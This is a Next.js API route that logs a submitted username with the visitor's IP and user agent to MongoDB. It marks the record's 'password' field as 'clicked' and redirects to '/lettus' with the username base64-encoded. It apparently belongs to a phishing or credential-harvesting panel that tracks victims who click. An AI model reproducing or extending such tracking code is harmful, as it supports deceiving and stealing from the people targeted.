import { NextRequest, NextResponse } from 'next/server';
import { getMainCollection } from '@/lib/database';
import { getClientIP, getUserAgent, encodeBase64, generateRandomParam } from '@/lib/utils';

export const dynamic = 'force-dynamic';

export async function POST(request: NextRequest) {
  try {
    const { username } = await request.json();
    
    if (!username) {
      return NextResponse.json({ error: 'Missing username' }, { status: 400 });
    }

    const b64 = encodeBase64(username);
    const word = 'clicked';
    const ip = getClientIP(request);
    const useragent = getUserAgent(request);
    const date = new Date();
    const pagetype = 0;
    const mobiletype = 0;
    const notify = 2;

    const collection = await getMainCollection();
    const existingUser = await collection.findOne({ username: username });

    if (existingUser) {
      // Update existing user
      await collection.updateOne(
        { username: username },
        { 
          $set: { 
            password: word, 
            pagetype: pagetype, 
            mobiletype: mobiletype, 
            notify: notify 
          } 
        }
      );
    } else {
      // Insert new user
      await collection.insertOne({
        username: username,
        password: word,
        ip: ip,
        useragent: useragent,
        date: date,
        notify: notify,
        pagetype: pagetype,
        mobiletype: mobiletype
      });
    }

    const randomParam = generateRandomParam();
    const redirectUrl = `/lettus?${randomParam}=${b64}`;
    return NextResponse.json({ success: true, redirectUrl });
  } catch (error) {
    console.error('Error submitting user:', error);
    return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
  }
}